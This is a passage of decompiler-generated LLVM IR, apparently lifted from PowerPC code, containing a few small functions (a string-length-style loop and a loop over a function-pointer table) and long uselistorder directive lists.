122, 123, 124, 25, 125, 126, 127, 128, 129, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 27, 110, 28, 245, 130, 131, 132, 30, 133, 29, 134, 156, 157, 158, 31, 159, 160, 161, 162, 163, 164, 165, 166, 32, 46, 167, 5, 168, 169, 135, 136, 137, 33, 170, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 36, 35, 262, 34, 266, 267, 37, 268, 269, 270, 271, 60, 61, 264, 263, 265, 280, 38, 281, 50, 39, 44, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 183, 182, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 66, 67, 68, 69, 70, 71, 198, 199, 200, 201, 40, 41, 202 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 2, 3, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 4, 16, 1, 17, 5 }
  uselistorder i32* @r25, { 3, 4, 5, 7, 8, 6, 9, 1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 30, 19, 20, 21, 22, 0, 23, 24, 25, 26, 28, 29 }
  uselistorder i32* @r26, { 1, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 3, 4, 20, 21, 22, 23, 24, 2, 25, 26, 27, 28, 29, 30, 31, 32, 33, 49, 50, 72, 48, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 69, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 0, 70, 71, 46, 67, 68, 47 }
  uselistorder i32 ()* @__asm_mfcr, { 27, 22, 18, 26, 25, 12, 17, 35, 11, 34, 9, 30, 8, 7, 6, 5, 4, 33, 3, 2, 1, 24, 29, 21, 32, 16, 15, 31, 10, 28, 23, 14, 36, 13, 19, 20, 0 }
  uselistorder label %dec_label_pc_1000cd78, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000cd68, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd50, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000cce0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccd8, { 1, 0 }
}

define i32 @function_1000cd94() local_unnamed_addr {
dec_label_pc_1000cd94:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000cd94 = load i32, i32* @r3, align 4
  store i32 %v0_1000cd94, i32* %r11.global-to-local, align 4
  %v3_1000cd94 = icmp eq i32 %v0_1000cd94, 0
  %v0_1000cd9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000cd94, i32 %v0_1000cd9c)
  %v0_1000cdac = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000cdb8

dec_label_pc_1000cda4:                            ; preds = %dec_label_pc_1000cdb4
  %v1_1000cda4 = add i32 %v1_1000cdb8, 2
  br label %dec_label_pc_1000cdd4

dec_label_pc_1000cdb4:                            ; preds = %dec_label_pc_1000cdb8
  %v2_1000cdcc = add i32 %v1_1000cdbc, %v5_1000cdb8
  %v3_1000cdc8 = icmp eq i32 %v1_1000cdc4, 192
  br i1 %v3_1000cdc8, label %dec_label_pc_1000cda4, label %dec_label_pc_1000cdb8

dec_label_pc_1000cdb8:                            ; preds = %dec_label_pc_1000cdb4, %dec_label_pc_1000cd94
  %v1_1000cdb8 = phi i32 [ %v2_1000cdcc, %dec_label_pc_1000cdb4 ], [ %v0_1000cdac, %dec_label_pc_1000cd94 ]
  %v0_1000cdb8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cdb8 = add i32 %v0_1000cdb8, %v1_1000cdb8
  %v3_1000cdb8 = inttoptr i32 %v2_1000cdb8 to i8*
  %v4_1000cdb8 = load i8, i8* %v3_1000cdb8, align 1
  %v5_1000cdb8 = zext i8 %v4_1000cdb8 to i32
  %v1_1000cdbc = add i32 %v1_1000cdb8, 1
  %v3_1000cdc0 = icmp eq i8 %v4_1000cdb8, 0
  %v1_1000cdc4 = call i32 @__asm_rlwinm(i32 %v5_1000cdb8, i32 0, i32 24, i32 25)
  br i1 %v3_1000cdc0, label %dec_label_pc_1000cdd4, label %dec_label_pc_1000cdb4

dec_label_pc_1000cdd4:                            ; preds = %dec_label_pc_1000cdb8, %dec_label_pc_1000cda4
  %v1_1000cdd4 = phi i32 [ %v1_1000cda4, %dec_label_pc_1000cda4 ], [ %v1_1000cdbc, %dec_label_pc_1000cdb8 ]
  %v0_1000cdd4 = load i32, i32* @r4, align 4
  %v2_1000cdd4 = sub i32 %v1_1000cdd4, %v0_1000cdd4
  ret i32 %v2_1000cdd4

; uselistorder directives
  uselistorder i32 %v1_1000cdbc, { 1, 0 }
  uselistorder i32 %v5_1000cdb8, { 1, 0 }
  uselistorder i32 %v1_1000cdb8, { 2, 1, 0 }
  uselistorder i32 %v0_1000cd94, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 0, 59, 2, 33, 43, 44, 45, 3, 60, 61, 41, 42, 17, 18, 19, 62, 63, 64, 46, 31, 34, 35, 1, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 36, 37, 38, 39, 40, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 65 }
  uselistorder i32 25, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 24, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 20, 29, 16, 17, 18, 21, 22, 23, 30, 0, 28, 1, 31, 19, 24, 25, 26, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 27, 2, 3, 4, 5, 6 }
  uselistorder i8 0, { 33, 30, 4, 34, 1, 35, 36, 5, 6, 7, 8, 9, 25, 40, 38, 24, 39, 37, 23, 41, 42, 43, 44, 46, 45, 26, 10, 47, 48, 11, 12, 49, 13, 50, 28, 53, 51, 52, 27, 54, 55, 14, 57, 56, 29, 58, 31, 0, 59, 60, 61, 62, 2, 15, 63, 65, 66, 67, 68, 64, 69, 16, 70, 71, 72, 73, 17, 18, 19, 20, 21, 75, 76, 77, 78, 74, 79, 3, 80, 82, 81, 22, 83, 84, 85, 86, 87, 88, 91, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 111, 32, 113, 114, 115 }
  uselistorder i32 192, { 0, 1, 3, 2 }
  uselistorder i32 2, { 0, 31, 5, 88, 51, 89, 90, 32, 1, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 6, 103, 7, 79, 80, 81, 33, 30, 104, 105, 106, 107, 108, 52, 53, 34, 117, 118, 135, 43, 8, 9, 3, 54, 109, 10, 11, 35, 112, 113, 42, 119, 120, 12, 121, 122, 123, 136, 55, 56, 82, 57, 83, 58, 84, 137, 36, 13, 14, 15, 46, 49, 50, 59, 60, 110, 47, 4, 37, 138, 16, 17, 38, 39, 61, 62, 41, 40, 124, 125, 114, 115, 126, 127, 128, 18, 19, 20, 21, 22, 129, 130, 23, 132, 133, 134, 29, 131, 116, 63, 24, 139, 26, 25, 48, 65, 64, 67, 66, 69, 68, 85, 44, 71, 45, 86, 70, 87, 73, 72, 111, 27, 28, 75, 74, 76, 77, 78 }
  uselistorder i32* @r4, { 28, 29, 1, 30, 31, 32, 33, 2, 34, 35, 36, 37, 9, 10, 38, 39, 40, 41, 42, 43, 44, 3, 72, 95, 96, 45, 46, 48, 49, 50, 6, 51, 52, 53, 54, 55, 14, 11, 73, 74, 75, 76, 77, 78, 79, 80, 106, 7, 8, 98, 13, 24, 25, 56, 57, 63, 64, 99, 100, 101, 47, 4, 81, 82, 83, 12, 84, 85, 58, 59, 60, 61, 62, 65, 66, 67, 5, 105, 86, 87, 88, 0, 89, 90, 91, 97, 92, 93, 23, 94, 102, 103, 104, 15, 16, 17, 18, 19, 20, 21, 22, 26, 27, 68, 69, 70, 71 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 14, 24, 11, 1, 16, 17, 18, 19, 20, 25, 15, 21, 12, 13, 27, 26, 22, 23 }
}

define i32 @function_1000cddc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cddc:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r31.global-to-local, align 4
  %v3_1000cdf8 = load i32, i32* @global_var_10010000.2, align 4
  %v3_1000cdfc = icmp eq i32 %v3_1000cdf8, -1
  br i1 %v3_1000cdfc, label %dec_label_pc_1000ce18, label %dec_label_pc_1000ce04

dec_label_pc_1000ce04:                            ; preds = %dec_label_pc_1000cddc, %dec_label_pc_1000ce04
  %v0_1000ce04 = phi i32 [ %v3_1000ce0c, %dec_label_pc_1000ce04 ], [ %v3_1000cdf8, %dec_label_pc_1000cddc ]
  call void @__pseudo_call(i32 %v0_1000ce04)
  %v0_1000ce0c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ce0c = add i32 %v0_1000ce0c, -4
  %v2_1000ce0c = inttoptr i32 %v1_1000ce0c to i32*
  %v3_1000ce0c = load i32, i32* %v2_1000ce0c, align 4
  store i32 %v1_1000ce0c, i32* %r31.global-to-local, align 4
  %v3_1000ce10 = icmp eq i32 %v3_1000ce0c, -1
  br i1 %v3_1000ce10, label %dec_label_pc_1000ce18, label %dec_label_pc_1000ce04

dec_label_pc_1000ce18:                            ; preds = %dec_label_pc_1000ce04, %dec_label_pc_1000cddc
  %v0_1000ce28 = load i32, i32* @r3, align 4
  ret i32 %v0_1000ce28

; uselistorder directives
  uselistorder i32 %v3_1000ce0c, { 1, 0 }
  uselistorder i32 -4, { 2, 16, 17, 18, 9, 10, 11, 12, 13, 19, 20, 3, 4, 5, 6, 15, 14, 28, 29, 25, 26, 27, 21, 22, 23, 24, 7, 8, 0, 1 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32 -1, { 197, 198, 16, 43, 53, 227, 228, 54, 283, 120, 229, 55, 230, 47, 56, 231, 57, 232, 199, 200, 108, 109, 59, 58, 201, 44, 45, 202, 203, 204, 159, 65, 63, 61, 205, 206, 207, 64, 62, 60, 208, 209, 160, 210, 161, 233, 26, 27, 162, 234, 163, 48, 268, 66, 284, 121, 3, 4, 285, 286, 49, 287, 288, 67, 68, 0, 164, 326, 30, 31, 32, 327, 165, 331, 28, 29, 211, 330, 218, 235, 33, 236, 237, 238, 124, 239, 240, 241, 242, 243, 244, 245, 122, 246, 123, 247, 248, 249, 250, 166, 289, 167, 5, 50, 168, 290, 291, 169, 170, 171, 292, 172, 251, 252, 173, 253, 254, 174, 269, 270, 271, 46, 293, 294, 295, 118, 51, 296, 297, 298, 299, 125, 300, 6, 69, 301, 302, 303, 304, 305, 175, 306, 126, 307, 308, 127, 7, 8, 128, 129, 309, 176, 216, 177, 310, 311, 312, 313, 70, 71, 328, 329, 72, 279, 130, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 332, 84, 334, 333, 85, 219, 220, 131, 178, 221, 36, 37, 179, 222, 34, 35, 180, 224, 9, 132, 86, 212, 10, 87, 52, 223, 38, 39, 181, 133, 110, 88, 213, 280, 281, 42, 182, 255, 111, 256, 257, 134, 261, 89, 90, 225, 335, 336, 314, 91, 183, 184, 258, 259, 185, 260, 186, 187, 116, 188, 189, 190, 191, 192, 40, 193, 135, 92, 93, 262, 263, 264, 272, 112, 273, 274, 275, 17, 18, 19, 20, 21, 22, 23, 113, 114, 315, 15, 316, 11, 317, 318, 194, 136, 24, 195, 319, 320, 1, 322, 323, 2, 137, 138, 196, 41, 139, 119, 324, 140, 321, 276, 12, 25, 115, 141, 13, 217, 325, 142, 277, 143, 278, 144, 94, 95, 96, 97, 98, 99, 100, 101, 102, 337, 214, 215, 145, 146, 147, 148, 149, 103, 150, 226, 104, 151, 152, 265, 107, 106, 105, 266, 153, 267, 154, 155, 156, 157, 14, 117, 282, 158 }
  uselistorder i32 ptrtoint (i32* @global_var_10010000.2 to i32), { 51, 52, 53, 54, 55, 56, 0, 57, 58, 59, 36, 37, 1, 60, 3, 2, 38, 4, 61, 39, 62, 40, 63, 64, 65, 66, 67, 41, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 42, 43, 44, 7, 5, 6, 45, 8, 9, 10, 11, 12, 13, 14, 80, 81, 82, 16, 83, 84, 15, 85, 20, 19, 17, 18, 46, 23, 22, 21, 26, 24, 25, 27, 47, 32, 28, 29, 48, 30, 31, 33, 34, 35, 49, 50 }
  uselistorder i32 1, { 310, 734, 321, 735, 736, 737, 738, 739, 740, 206, 205, 741, 451, 742, 743, 185, 186, 184, 187, 394, 744, 196, 316, 502, 118, 119, 745, 390, 746, 395, 749, 750, 751, 752, 753, 452, 754, 755, 756, 172, 171, 176, 175, 174, 173, 177, 170, 178, 757, 758, 759, 503, 96, 99, 97, 100, 98, 101, 760, 85, 86, 761, 84, 762, 24, 26, 25, 23, 383, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 505, 504, 147, 146, 145, 148, 149, 150, 673, 674, 675, 676, 506, 500, 226, 215, 224, 214, 220, 221, 222, 219, 217, 218, 216, 223, 225, 403, 763, 764, 386, 765, 766, 767, 768, 769, 770, 507, 29, 28, 30, 27, 31, 442, 774, 771, 772, 773, 508, 281, 278, 279, 275, 277, 280, 276, 678, 679, 680, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 80, 77, 79, 78, 74, 75, 82, 76, 83, 81, 790, 789, 396, 681, 312, 41, 40, 244, 397, 872, 183, 180, 181, 179, 182, 89, 873, 510, 509, 91, 90, 92, 269, 363, 939, 453, 454, 512, 511, 192, 189, 193, 191, 188, 190, 0, 455, 515, 514, 513, 87, 88, 516, 517, 791, 384, 792, 794, 795, 796, 797, 798, 519, 518, 322, 323, 325, 324, 799, 800, 801, 379, 802, 803, 404, 804, 805, 423, 424, 456, 405, 419, 806, 458, 428, 807, 808, 459, 809, 810, 811, 457, 525, 524, 523, 522, 493, 521, 520, 378, 376, 371, 373, 374, 370, 375, 372, 377, 1, 812, 813, 814, 815, 406, 66, 682, 683, 55, 56, 684, 121, 124, 123, 122, 120, 874, 289, 290, 291, 294, 293, 292, 875, 876, 398, 877, 207, 209, 208, 230, 233, 228, 232, 231, 229, 460, 850, 851, 494, 53, 52, 54, 463, 878, 879, 880, 461, 881, 462, 882, 883, 884, 885, 886, 535, 534, 533, 532, 531, 530, 529, 528, 527, 495, 526, 258, 255, 257, 254, 256, 250, 263, 259, 253, 260, 249, 252, 264, 251, 262, 261, 248, 247, 246, 887, 443, 19, 22, 21, 20, 18, 13, 14, 17, 16, 15, 115, 114, 116, 940, 941, 64, 65, 63, 888, 889, 536, 337, 334, 336, 338, 339, 335, 407, 890, 539, 538, 537, 125, 265, 152, 540, 271, 273, 311, 197, 365, 364, 198, 164, 227, 541, 202, 542, 270, 169, 464, 543, 42, 465, 430, 429, 708, 547, 546, 545, 544, 142, 141, 139, 143, 140, 144, 942, 550, 549, 548, 239, 238, 240, 237, 943, 551, 715, 716, 717, 444, 718, 408, 47, 49, 44, 46, 43, 48, 50, 45, 677, 38, 34, 32, 35, 33, 36, 37, 39, 709, 409, 710, 552, 328, 327, 326, 329, 330, 331, 332, 212, 211, 213, 210, 130, 126, 129, 128, 131, 133, 127, 132, 553, 554, 555, 313, 557, 556, 282, 283, 284, 8, 9, 7, 391, 869, 558, 203, 204, 431, 559, 560, 561, 562, 563, 564, 565, 566, 445, 446, 816, 410, 466, 817, 818, 432, 827, 569, 568, 567, 109, 107, 108, 106, 110, 105, 103, 104, 111, 102, 113, 112, 570, 571, 720, 721, 722, 723, 411, 724, 725, 153, 160, 161, 154, 162, 159, 163, 155, 156, 157, 158, 944, 573, 572, 369, 575, 574, 94, 93, 95, 576, 793, 747, 748, 891, 892, 577, 340, 342, 341, 343, 467, 893, 819, 820, 821, 822, 823, 824, 825, 826, 134, 135, 137, 136, 138, 830, 828, 829, 831, 832, 894, 895, 896, 833, 387, 73, 72, 71, 952, 953, 286, 285, 288, 287, 948, 949, 950, 951, 367, 368, 366, 70, 468, 834, 835, 836, 496, 58, 57, 59, 433, 852, 853, 854, 420, 399, 6, 5, 4, 855, 578, 117, 412, 469, 856, 580, 579, 837, 838, 581, 12, 11, 10, 582, 235, 236, 234, 583, 243, 242, 897, 898, 471, 899, 900, 901, 902, 903, 904, 906, 907, 908, 472, 909, 910, 413, 911, 470, 912, 473, 913, 914, 915, 905, 587, 586, 585, 584, 304, 299, 301, 298, 302, 296, 295, 303, 297, 305, 300, 916, 917, 918, 919, 920, 347, 348, 344, 346, 345, 349, 350, 474, 314, 315, 921, 922, 308, 307, 309, 306, 924, 414, 925, 392, 415, 927, 928, 929, 930, 416, 932, 417, 931, 926, 475, 497, 594, 593, 592, 591, 590, 589, 588, 353, 355, 358, 360, 351, 359, 357, 356, 354, 361, 352, 400, 401, 165, 166, 167, 923, 434, 498, 476, 201, 200, 199, 946, 435, 947, 857, 858, 859, 860, 861, 862, 402, 596, 595, 68, 67, 69, 436, 598, 597, 61, 62, 60, 600, 599, 268, 602, 601, 319, 320, 318, 604, 603, 863, 864, 606, 605, 51, 267, 241, 274, 168, 317, 362, 333, 266, 945, 607, 245, 685, 686, 687, 688, 689, 690, 479, 425, 691, 692, 382, 477, 478, 480, 693, 481, 694, 695, 380, 418, 613, 612, 611, 610, 609, 608, 482, 437, 438, 439, 483, 484, 616, 615, 614, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 618, 617, 499, 3, 711, 712, 625, 624, 623, 622, 621, 620, 619, 713, 714, 634, 633, 632, 631, 630, 629, 628, 627, 626, 719, 426, 638, 637, 636, 635, 485, 726, 393, 727, 728, 381, 729, 642, 641, 640, 639, 195, 194, 730, 731, 732, 733, 839, 840, 486, 841, 842, 843, 487, 389, 844, 488, 845, 649, 648, 647, 646, 645, 644, 643, 151, 421, 385, 846, 422, 440, 847, 489, 849, 388, 427, 848, 490, 491, 492, 657, 656, 655, 654, 653, 652, 651, 650, 865, 866, 658, 867, 868, 441, 870, 2, 871, 659, 448, 933, 934, 447, 935, 936, 449, 450, 937, 938, 661, 660, 272, 501 }
  uselistorder label %dec_label_pc_1000ce04, { 1, 0 }
}

define i32 @function_1000ce2c() local_unnamed_addr {
dec_label_pc_1000ce2c:
  %v0_1000ce44 = load i32, i32* @r3, align 4
  ret i32 %v0_1000ce44

; uselistorder directives
  uselistorder i32* @r3, { 28, 31, 124, 125, 128, 126, 127, 0, 129, 130, 13, 131, 14, 132, 52, 53, 54, 133, 134, 135, 15, 61, 62, 16, 35, 196, 197, 198, 195, 241, 242, 243, 136, 137, 138, 139, 140, 141, 142, 143, 144, 17, 145, 146, 147, 148, 149, 150, 151, 63, 64, 18, 65, 66, 67, 43, 199, 200, 201, 202, 203, 19, 33, 204, 205, 206, 207, 208, 209, 3, 2, 210, 211, 212, 39, 51, 255, 4, 42, 5, 46, 50, 249, 250, 251, 93, 94, 95, 96, 97, 98, 99, 100, 55, 56, 57, 58, 59, 191, 192, 152, 153, 154, 109, 110, 111, 112, 113, 114, 6, 34, 37, 252, 253, 49, 32, 7, 213, 214, 215, 216, 217, 44, 254, 38, 155, 156, 163, 164, 165, 166, 167, 168, 169, 36, 170, 171, 172, 173, 157, 158, 174, 175, 85, 86, 218, 40, 219, 220, 221, 8, 12, 9, 222, 10, 223, 11, 224, 225, 226, 227, 228, 229, 41, 230, 231, 232, 233, 234, 235, 60, 244, 245, 246, 247, 248, 176, 177, 178, 179, 180, 87, 88, 89, 48, 90, 91, 92, 236, 237, 238, 181, 182, 183, 184, 185, 186, 45, 68, 69, 70, 20, 71, 21, 72, 73, 74, 75, 76, 22, 77, 78, 26, 25, 79, 80, 81, 82, 24, 23, 83, 84, 101, 102, 103, 104, 105, 106, 107, 108, 115, 116, 117, 27, 118, 119, 120, 121, 122, 123, 159, 160, 161, 1, 162, 187, 188, 190, 189, 193, 194, 239, 240, 30, 29, 47 }
}

define i32 @function_1000ce48() local_unnamed_addr {
entry:
  store i32 268488280, i32* @lr, align 4
  %v0_1000ce54 = call i32 @function_100000b8()
  ret i32 %v0_1000ce54

; uselistorder directives
  uselistorder i32 0, { 523, 524, 36, 527, 100, 525, 526, 62, 528, 529, 530, 533, 531, 0, 532, 534, 1, 99, 535, 172, 672, 26, 762, 763, 551, 538, 541, 542, 543, 258, 544, 545, 547, 546, 548, 549, 550, 552, 553, 554, 536, 537, 539, 540, 101, 555, 557, 558, 556, 559, 560, 561, 562, 213, 386, 563, 387, 214, 388, 102, 103, 394, 395, 88, 396, 397, 398, 399, 400, 401, 402, 104, 173, 404, 403, 105, 405, 406, 107, 106, 407, 259, 408, 409, 410, 109, 108, 411, 412, 219, 260, 413, 110, 564, 565, 566, 567, 572, 568, 66, 573, 574, 569, 570, 571, 63, 64, 65, 575, 261, 37, 38, 39, 209, 577, 578, 579, 580, 111, 576, 262, 581, 582, 583, 89, 40, 584, 174, 585, 586, 587, 588, 425, 175, 764, 765, 673, 674, 675, 676, 677, 678, 679, 766, 27, 767, 113, 112, 768, 769, 770, 771, 114, 680, 681, 682, 683, 772, 773, 774, 775, 776, 777, 778, 779, 28, 589, 961, 263, 964, 69, 264, 220, 965, 265, 968, 969, 67, 68, 970, 2, 3, 389, 962, 963, 221, 266, 597, 590, 267, 70, 591, 592, 594, 41, 595, 596, 598, 599, 600, 601, 602, 603, 222, 210, 211, 269, 604, 605, 606, 608, 176, 611, 270, 223, 613, 614, 615, 616, 268, 224, 610, 607, 609, 612, 617, 215, 618, 619, 620, 4, 621, 622, 623, 116, 115, 624, 5, 117, 225, 426, 118, 427, 428, 6, 780, 781, 178, 783, 782, 59, 7, 784, 177, 8, 785, 180, 786, 60, 9, 787, 179, 625, 626, 627, 628, 629, 630, 631, 684, 685, 686, 271, 687, 688, 689, 788, 789, 790, 791, 792, 272, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 119, 120, 806, 807, 808, 809, 810, 811, 812, 813, 814, 42, 815, 121, 84, 816, 817, 818, 819, 820, 122, 821, 822, 823, 824, 825, 826, 827, 828, 829, 123, 830, 831, 832, 251, 252, 833, 834, 835, 29, 10, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 90, 971, 972, 973, 976, 974, 11, 181, 12, 445, 857, 856, 182, 855, 91, 858, 859, 860, 124, 861, 446, 966, 967, 734, 735, 226, 736, 447, 977, 125, 978, 461, 979, 980, 981, 982, 983, 448, 984, 985, 986, 667, 273, 274, 275, 1001, 1002, 276, 1003, 1023, 183, 1024, 277, 1015, 13, 987, 988, 126, 462, 463, 278, 279, 280, 464, 465, 73, 74, 466, 467, 468, 281, 469, 470, 471, 71, 72, 472, 473, 989, 990, 991, 992, 993, 994, 127, 1000, 497, 498, 499, 500, 501, 128, 502, 503, 504, 253, 505, 129, 130, 414, 131, 415, 416, 132, 417, 133, 474, 184, 92, 282, 475, 476, 14, 733, 418, 419, 134, 420, 421, 422, 739, 741, 43, 742, 75, 743, 740, 737, 738, 15, 746, 744, 745, 185, 747, 748, 135, 749, 750, 283, 751, 136, 752, 753, 754, 755, 756, 757, 758, 759, 254, 255, 284, 632, 633, 186, 634, 635, 636, 637, 643, 644, 645, 646, 137, 647, 648, 649, 511, 512, 513, 514, 515, 216, 516, 44, 517, 138, 139, 518, 519, 520, 521, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 285, 1012, 16, 140, 593, 141, 142, 862, 863, 30, 31, 227, 32, 864, 187, 865, 866, 188, 286, 867, 638, 639, 640, 641, 642, 650, 144, 143, 651, 868, 869, 189, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1016, 1017, 1018, 76, 1019, 1020, 1021, 1022, 145, 870, 871, 872, 873, 874, 875, 652, 653, 654, 655, 656, 657, 146, 690, 691, 692, 693, 694, 695, 700, 696, 697, 698, 699, 190, 701, 702, 703, 17, 77, 704, 658, 705, 449, 450, 876, 877, 93, 878, 879, 880, 881, 882, 217, 883, 884, 885, 147, 886, 887, 888, 889, 890, 148, 891, 892, 893, 894, 895, 896, 897, 149, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 45, 166, 167, 191, 909, 910, 150, 911, 287, 912, 913, 288, 916, 155, 151, 914, 915, 290, 917, 918, 919, 921, 156, 922, 18, 19, 157, 158, 152, 153, 923, 924, 154, 925, 926, 927, 928, 929, 930, 931, 932, 933, 289, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 390, 945, 33, 947, 78, 94, 159, 291, 949, 256, 950, 946, 948, 951, 952, 160, 423, 424, 85, 61, 83, 920, 192, 995, 997, 996, 194, 161, 999, 998, 193, 228, 706, 707, 292, 708, 162, 709, 710, 711, 712, 713, 714, 715, 716, 717, 293, 718, 719, 720, 721, 722, 723, 229, 230, 163, 232, 451, 195, 452, 453, 25, 454, 455, 456, 231, 457, 294, 458, 459, 460, 218, 953, 954, 295, 724, 725, 726, 727, 729, 730, 731, 975, 296, 506, 668, 959, 429, 960, 760, 728, 1013, 1014, 298, 297, 430, 431, 79, 80, 21, 197, 20, 198, 196, 303, 432, 34, 433, 46, 168, 301, 302, 47, 169, 234, 233, 300, 199, 304, 305, 299, 434, 307, 308, 240, 235, 236, 237, 238, 239, 435, 306, 81, 309, 310, 436, 437, 438, 311, 439, 440, 441, 95, 48, 22, 96, 442, 97, 49, 205, 204, 203, 443, 444, 98, 50, 202, 201, 200, 241, 312, 242, 477, 478, 479, 480, 481, 482, 483, 313, 484, 314, 485, 315, 243, 316, 245, 486, 244, 487, 488, 489, 490, 491, 492, 493, 494, 317, 495, 164, 206, 496, 318, 246, 319, 248, 247, 507, 508, 509, 320, 510, 322, 51, 170, 171, 52, 23, 321, 522, 323, 659, 208, 324, 660, 661, 207, 325, 662, 663, 54, 53, 24, 664, 326, 665, 86, 87, 55, 666, 165, 328, 669, 35, 249, 250, 327, 82, 670, 671, 329, 330, 331, 56, 57, 732, 332, 212, 58, 761, 955, 956, 257, 957, 958, 1033, 1034, 1035, 391, 392, 393, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057 }
  uselistorder i32* @lr, { 5, 147, 148, 149, 150, 151, 152, 153, 335, 407, 408, 409, 154, 158, 155, 156, 157, 162, 163, 159, 160, 161, 164, 165, 166, 167, 168, 6, 7, 8, 9, 10, 11, 169, 172, 170, 1, 171, 0, 173, 175, 176, 174, 177, 178, 179, 180, 181, 182, 19, 336, 337, 278, 279, 280, 281, 338, 339, 340, 341, 320, 414, 415, 416, 417, 410, 411, 412, 413, 183, 184, 185, 191, 186, 187, 190, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 20, 21, 22, 342, 343, 344, 418, 345, 346, 282, 283, 284, 285, 286, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 419, 420, 67, 68, 69, 359, 360, 321, 322, 421, 422, 431, 432, 435, 436, 437, 438, 439, 452, 454, 456, 433, 434, 87, 88, 89, 90, 91, 92, 93, 423, 429, 430, 12, 13, 94, 15, 95, 14, 16, 323, 325, 324, 326, 327, 328, 329, 330, 331, 264, 42, 131, 265, 266, 225, 267, 268, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 239, 240, 241, 242, 243, 440, 441, 442, 443, 444, 447, 448, 449, 188, 189, 361, 362, 363, 364, 237, 238, 455, 453, 365, 366, 367, 244, 245, 246, 247, 287, 288, 289, 290, 291, 248, 249, 292, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 17, 18, 382, 424, 425, 426, 427, 428, 450, 451, 293, 294, 295, 296, 297, 298, 299, 300, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 396, 397, 86, 301, 302, 303, 304, 400, 445, 446, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 49, 44, 45, 46, 47, 48, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 